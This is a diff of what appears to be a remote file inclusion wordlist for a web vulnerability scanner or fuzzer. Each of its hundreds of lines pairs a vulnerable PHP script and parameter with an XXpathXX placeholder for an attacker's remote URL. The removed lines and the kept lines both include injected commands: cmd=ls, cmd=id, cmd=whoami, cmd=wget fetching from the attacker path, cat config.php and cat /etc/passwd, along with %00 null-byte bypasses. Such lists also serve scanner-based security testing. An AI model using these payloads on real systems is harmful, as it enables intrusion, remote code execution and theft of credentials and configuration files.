@@ -5,8 +5,6 @@
 22_ultimate/templates/header.php?mainpath=XXpathXX?
 =XXpathXX
 ?_CONFIG[files][functions_page]=XXpathXX
-?npage=-1&content_dir=XXpathXX%00&cmd=ls
-?npage=1&content_dir=XXpathXX%00&cmd=ls
 ?show=XXpathXX?
 [path]/mybic_server.php?file=XXpathXX
 [path]/previewtheme.php?theme=1&inc_path=XXpathXX?cmd
@@ -93,7 +91,6 @@ admin/include/header.php?repertoire=XXpathXX?
 admin/include/lib.module.php?mod_root=XXpathXX
 admin/includes/admin_header.php?level=XXpathXX?
 admin/includes/author_panel_header.php?level=XXpathXX?
-admin/includes/header.php?bypass_installed=1&secure_page_path=XXpathXX%00
 admin/includes/spaw/spaw_control.class.php?spaw_root=XXpathXX?
 admin/index.php?path_to_script=XXpathXX?&cmd=ls
 admin/index.php?pg=XXpathXX?
@@ -237,7 +234,6 @@ arash_lib/class/arash_sadmin.class.php?arashlib_dir=XXpathXX
 arash_lib/include/edit.inc.php?arashlib_dir=XXpathXX
 arash_lib/include/list_features.inc.php?arashlib_dir=XXpathXX
 archive.php?scriptpath=XXpathXX?
-aroundme/template/barnraiser_01/pol_view.tpl.php?poll=1&templatePath=XXpathXX%00
 artlist.php?root_path=XXpathXX
 assets/plugins/mp3_id/mp3_id.php?GLOBALS[BASE]=XXpathXX?cmd
 assets/snippets/reflect/snippet.reflect.php?reflect_base=XXpathXX?
@@ -581,7 +577,6 @@ conf.php?securelib=XXpathXX?
 config.inc.php3?rel_path=XXpathXX
 config.inc.php?_path=XXpathXX
 config.inc.php?path_escape=XXpathXX
-config.inc.php?path_escape=XXpathXX%00
 config.php?full_path=XXpathXX?
 config.php?full_path_to_db=XXpathXX
 config.php?fullpath=XXpathXX
@@ -680,7 +675,6 @@ decoder/gallery.php?ccms_library_path=XXpathXX
 decoder/markdown.php?ccms_library_path=XXpathXX
 defaults_setup.php?ROOT_PATH=XXpathXX?cmd=ls
 defines.php?WEBCHATPATH=XXpathXX?
-demo/ms-pe02/catalog.php?cid=0&sid='%22&sortfield=title&sortorder=ASC&pagenumber=1&main=XXpathXX&
 depouilg.php3?NomVote=XXpathXX?
 development.php?root_prefix=XXpathXX?
 dfcode.php?DFORUM_PATH=XXpathXX?
@@ -723,7 +717,6 @@ doceboKms/modules/documents/tree.documents.php?GLOBALS[where_framework]=XXpathXX
 doceboLms/lib/lib.repo.php?GLOBALS[where_framework]=XXpathXX
 doceboScs/lib/lib.teleskill.php?GLOBALS[where_scs]=XXpathXX
 docs/front-end-demo/cart2.php?workdir=XXpathXX?
-dokeos/claroline/resourcelinker/resourcelinker.inc.php?clarolineRepositorySys=XXpathXX?&cmd=wget%20XXpathXX
 DON3/applications/don3_requiem.don3app/don3_requiem.php?app_path=XXpathXX
 DON3/applications/frontpage.don3app/frontpage.php?app_path=XXpathXX?
 dosearch.php?RESPATH=XXpathXX
@@ -979,7 +972,6 @@ include/common.php?XOOPS_ROOT_PATH=XXpathXX
 include/common_functions.php?baros_path=XXpathXX?
 include/config.inc.php?racine=XXpathXX
 include/copyright.php?tsep_config[absPath]=XXpathXX?cmd=ls
-include/customize.php?l=XXpathXX&text=Hello%20World
 include/default_header.php?script_path=XXpathXX
 include/define.php?INC_DIR=XXpathXX?
 include/disp_form.php3?cfg_include_dir=XXpathXX?
@@ -1146,7 +1138,6 @@ index.php?from=XXpathXX
 index.php?func=XXpathXX?
 index.php?function=custom&custom=XXpathXX
 index.php?function=XXpathXX
-index.php?G_JGALL[inc_path]=XXpathXX%00
 index.php?gen=XXpathXX
 index.php?get=XXpathXX
 index.php?gOo=XXpathXX
@@ -1180,7 +1171,6 @@ index.php?news_include_path=XXpathXX
 index.php?open=XXpathXX
 index.php?option=com_custompages&cpage=XXpathXX?
 index.php?page=XXpathXX
-index.php?page=XXpathXX%00
 index.php?page=XXpathXX?
 index.php?page[path]=XXpathXX?&cmd=ls
 index.php?pagename=XXpathXX
@@ -1573,22 +1563,12 @@ oneadmin/config-bak.php?include_once=XXpathXX
 oneadmin/config.php?path[docroot]=XXpathXX
 oneadmin/ecommerce/sampleecommerce.php?path[docroot]=XXpathXX?
 online.php?config[root_ordner]=XXpathXX?&cmd=id
-open-admin/plugins/site_protection/index.php?config%5boi_dir%5d=XXpathXX?
 openi-admin/base/fileloader.php?config[openi_dir]=XXpathXX
 openrat/themes/default/include/html/insert.inc.php?tpl_dir=XXpathXX???
-OpenSiteAdmin/indexFooter.php?path=XXpathXX%00
 OpenSiteAdmin/pages/pageHeader.php?path=XXpathXX?
-OpenSiteAdmin/scripts/classes/DatabaseManager.php?path=XXpathXX%00
-OpenSiteAdmin/scripts/classes/FieldManager.php?path=XXpathXX%00
-OpenSiteAdmin/scripts/classes/Filter.php?path=XXpathXX%00
-OpenSiteAdmin/scripts/classes/Filters/SingleFilter.php?path=XXpathXX%00
-OpenSiteAdmin/scripts/classes/Form.php?path=XXpathXX%00
-OpenSiteAdmin/scripts/classes/FormManager.php?path=XXpathXX%00
-OpenSiteAdmin/scripts/classes/LoginManager.php?path=XXpathXX%00
 opensurveypilot/administration/user/lib/group.inc.php?cfgPathToProjectAdmin=XXpathXX
 ops/gals.php?news_file=XXpathXX
 order/login.php?svr_rootscript=XXpathXX
-osData/php121/php121db.php?php121dir=XXpathXX%00
 ossigeno-suite-2.2_pre1/upload/xax/admin/modules/uninstall_module.php?level=XXpathXX?
 ossigeno_modules/ossigeno-catalogo/xax/ossigeno/catalogo/common.php?ossigeno=XXpathXX?
 owimg.php3?path=XXpathXX
@@ -1615,7 +1595,6 @@ php-nuke/modules/Forums/admin/admin_styles.php?phpbb_root_path=XXpathXX
 php.incs/common.inc.php?cm_basedir=XXpathXX?
 PHP/includes/header.inc.php?root=XXpathXX?
 php/init.gallery.php?include_class=XXpathXX/something
-php121db.php?php121dir=XXpathXX%00
 php4you.php?dir=XXpathXX?
 phpAdsNew-2.0.7/libraries/lib-remotehost.inc?phpAds_geoPlugin=XXpathXX?
 phpbb/sendmsg.php?phpbb_root_path=XXpathXX
@@ -1844,14 +1823,12 @@ sendstudio/admin/includes/createemails.inc.php?ROOTDIR=XXpathXX?
 sendstudio/admin/includes/send_emails.inc.php?ROOTDIR=XXpathXX?
 senetman/html/index.php?page=XXpathXX
 services.php?page=XXpathXX
-services/samples/inclusionService.php?CabronServiceFolder=XXpathXX%00
 settings.php?P[includes]=XXpathXX
 settings_sql.php?path=XXpathXX
 setup/inc/database.php?tcms_administer_site=XXpathXX
 setup/upgrader.php?RootDirectory=XXpathXX
 sezhoo/SezHooTabsAndActions.php?IP=XXpathXX
 shop/includes/header.inc.php?dateiPfad=XXpathXX
-shop/index.php?action=XXpathXX?&cmd=cat%20config.php
 shop/page.php?osCsid=XXpathXX?
 shop/page.php?pageid=XXpathXX?
 shoutbox.php?language=XXpathXX
@@ -1942,8 +1919,6 @@ str.php?p=XXpathXX
 streamline-1.0-beta4/src/core/theme/includes/account_footer.php?sl_theme_unix_path=XXpathXX
 streamline-1.0-beta4/src/core/theme/includes/account_footer.php?sl_theme_unix_path=XXpathXX?
 strload.php?LangFile=XXpathXX
-studip-1.3.0-2/studip-htdocs/archiv_assi.php?cmd=ls%20-al&ABSOLUTE_PATH_STUDIP=XXpathXX?
-studip-1.3.0-2/studip-phplib/oohforms.inc?cmd=ls%20-al&_PHPLIB[libdir]=XXpathXX?
 styles.php?toroot=XXpathXX
 styles/default/global_header.php?installed=23&domain=XXpathXX
 submit_abuse.php?path_prefix=XXpathXX
@@ -2038,10 +2013,8 @@ theme/test5.php?root=XXpathXX
 theme/test6.php?root=XXpathXX
 themes.php?GLOBALS[theme_path]=XXpathXX?
 themes/blackorange.php?root=XXpathXX
-themes/container.php?theme_directory=XXpathXX%00
 themes/default/layouts/standard.php?page_include=XXpathXX?&act=cmd&cmd=whoami&d=/&submit=1&cmd_txt=1
 themes/default/preview_post_completo.php?dir=XXpathXX
-themes/header.php?theme_directory=XXpathXX%00
 themes/ubb/login.php?theme=XXpathXX
 themes/ubb/login.php?theme=XXpathXX?
 thumbnail.php?module=gallery&GLOBALS[PTH][classes]=XXpathXX
@@ -2072,7 +2045,6 @@ upload/xax/ossigeno/admin/uninstall_module.php?level=XXpathXX?
 upload_local.php?target=XXpathXX?
 upload_multi.php?target=XXpathXX?
 urlinn_includes/config.php?dir_ws=XXpathXX?
-user.php?caselist[bad_file.txt][path]=XXpathXX&command=cat%20/etc/passwd
 user_language.php?INDM=r3d.w0rm&language_dir=XXpathXX?
 user_new_2.php?home=XXpathXX
 usr/extensions/get_calendar.inc.php?root_path=XXpathXX
